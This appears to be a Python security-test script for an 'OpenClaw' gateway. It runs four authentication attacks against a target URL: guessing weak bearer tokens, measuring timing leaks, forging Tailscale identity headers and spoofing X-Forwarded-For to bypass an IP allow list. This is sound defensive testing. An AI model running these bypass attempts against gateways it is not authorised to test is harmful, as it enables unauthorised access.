"""
OpenClaw Gateway Security Tests

Attack vectors for validating OpenClaw gateway authentication and network security.
All tests run in Docker containers for safety.
"""

import httpx
import time
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from loguru import logger


@dataclass
class AttackResult:
    """Result of a security test attack"""
    success: bool
    method: str
    details: str
    response_code: Optional[int] = None
    elapsed_ms: Optional[float] = None


class OpenClawGatewayAttacker:
    """
    Security testing framework for OpenClaw gateway.
    
    Tests:
    - A1: Token brute force
    - A2: Timing analysis
    - A3: Tailscale header spoofing
    - A4: IP whitelist bypass
    """
    
    def __init__(self, target_url: str, timeout: int = 5):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.results: List[AttackResult] = []
        
    def test_weak_token_patterns(self) -> AttackResult:
        """
        A1: Test common weak token patterns.
        Based on isWeakGatewayToken() patterns.
        """
        weak_patterns = [
            "test",
            "demo",
            "example",
            "openclaw-verifier-token-123",
            "clawdbot-verifier-token-123",
            "password123",
            "token",
            "secret",
        ]
        
        for token in weak_patterns:
            try:
                start = time.time()
                resp = httpx.post(
                    f"{self.target_url}/ws",
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=self.timeout
                )
                elapsed = (time.time() - start) * 1000
                
                if resp.status_code == 200 or resp.status_code == 101:
                    return AttackResult(
                        success=True,
                        method="weak_token_brute_force",
                        details=f"Weak token '{token}' accepted",
                        response_code=resp.status_code,
                        elapsed_ms=elapsed
                    )
            except Exception as e:
                continue
                
        return AttackResult(
            success=False,
            method="weak_token_brute_force",
            details="No weak tokens accepted (good!)"
        )
    
    def test_timing_attack(self, token_length: int = 43) -> AttackResult:
        """
        A2: Test for timing leaks in token comparison.
        Measures response time variance with incorrect tokens.
        """
        timings: List[float] = []
        
        # Test with tokens that match progressively more characters
        for i in range(5):
            # Generate token with i matching prefix characters
            test_token = 'A' * i + 'X' * (token_length - i)
            
            try:
                start = time.perf_counter()
                httpx.post(
                    f"{self.target_url}/ws",
                    headers={"Authorization": f"Bearer {test_token}"},
                    timeout=self.timeout
                )
                elapsed = (time.perf_counter() - start) * 1000
                timings.append(elapsed)
            except Exception as e:
                logger.debug("HTTP request failed: {}", e)
        
        if len(timings) >= 3:
            # Check for timing variance (should be constant if using safeEqual)
            variance = max(timings) - min(timings)
            if variance > 10:  # More than 10ms variance is suspicious
                return AttackResult(
                    success=True,
                    method="timing_attack",
                    details=f"Timing variance detected: {variance:.2f}ms",
                    elapsed_ms=variance
                )
        
        return AttackResult(
            success=False,
            method="timing_attack",
            details="No timing leak detected (good!)"
        )
    
    def test_tailscale_header_spoof(self) -> AttackResult:
        """
        A3: Test Tailscale header spoofing.
        Attempts to bypass authentication with forged Tailscale headers.
        """
        spoofed_headers = {
            "Tailscale-User-Login": "attacker@evil.com",
            "Tailscale-User-Name": "Attacker",
            "X-Forwarded-For": "100.64.0.1",  # Tailscale CGNAT range
            "X-Forwarded-Proto": "https",
            "X-Forwarded-Host": "gateway.ts.net"
        }
        
        try:
            start = time.time()
            resp = httpx.post(
                f"{self.target_url}/ws",
                headers=spoofed_headers,
                timeout=self.timeout
            )
            elapsed = (time.time() - start) * 1000
            
            if resp.status_code == 200 or resp.status_code == 101:
                return AttackResult(
                    success=True,
                    method="tailscale_header_spoof",
                    details="Tailscale headers accepted without whois verification",
                    response_code=resp.status_code,
                    elapsed_ms=elapsed
                )
        except Exception as e:
            pass
            
        return AttackResult(
            success=False,
            method="tailscale_header_spoof",
            details="Tailscale header spoofing blocked (good!)"
        )
    
    def test_ip_whitelist_bypass(self) -> AttackResult:
        """
        A4: Test IP whitelist bypass via proxy headers.
        Attempts to appear as trusted IP via X-Forwarded-For.
        """
        trusted_ips = [
            "127.0.0.1",
            "::1",
            "100.64.0.1",  # Tailscale CGNAT
            "192.168.1.1"  # Common LAN
        ]
        
        for ip in trusted_ips:
            try:
                headers = {
                    "X-Forwarded-For": ip,
                    "X-Real-IP": ip
                }
                start = time.time()
                resp = httpx.post(
                    f"{self.target_url}/ws",
                    headers=headers,
                    timeout=self.timeout
                )
                elapsed = (time.time() - start) * 1000
                
                if resp.status_code == 200 or resp.status_code == 101:
                    return AttackResult(
                        success=True,
                        method="ip_whitelist_bypass",
                        details=f"Bypassed IP whitelist via spoofed IP: {ip}",
                        response_code=resp.status_code,
                        elapsed_ms=elapsed
                    )
            except Exception:
                continue
                
        return AttackResult(
            success=False,
            method="ip_whitelist_bypass",
            details="IP whitelist enforcement working (good!)"
        )
    
    def run_all_tests(self) -> List[AttackResult]:
        """Run all security tests and return results"""
        print("[*] Testing OpenClaw Gateway Security...")
        print(f"[*] Target: {self.target_url}\n")
        
        tests = [
            ("Weak Token Patterns", self.test_weak_token_patterns),
            ("Timing Attack", self.test_timing_attack),
            ("Tailscale Header Spoof", self.test_tailscale_header_spoof),
            ("IP Whitelist Bypass", self.test_ip_whitelist_bypass),
        ]
        
        results = []
        for name, test_func in tests:
            print(f"[*] Running: {name}")
            result = test_func()
            results.append(result)
            
            status = "❌ VULNERABLE" if result.success else "✅ SECURE"
            print(f"    {status}: {result.details}\n")
        
        self.results = results
        return results
    
    def print_summary(self):
        """Print test summary"""
        successful_attacks = [r for r in self.results if r.success]
        total_tests = len(self.results)
        
        print("\n" + "=" * 60)
        print("SECURITY TEST SUMMARY")
        print("=" * 60)
        print(f"Total Tests: {total_tests}")
        print(f"Successful Attacks: {len(successful_attacks)}")
        print(f"Blocked Attacks: {total_tests - len(successful_attacks)}")
        print()
        
        if successful_attacks:
            print("⚠️  VULNERABILITIES FOUND:")
            for result in successful_attacks:
                print(f"  - {result.method}: {result.details}")
        else:
            print("✅ NO VULNERABILITIES FOUND")
        print("=" * 60)


def main():
    """CLI entry point"""
    import sys
    
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:7777"
    
    attacker = OpenClawGatewayAttacker(target)
    attacker.run_all_tests()
    attacker.print_summary()
    
    # Exit with non-zero if vulnerabilities found
    sys.exit(len([r for r in attacker.results if r.success]))


if __name__ == "__main__":
    main()
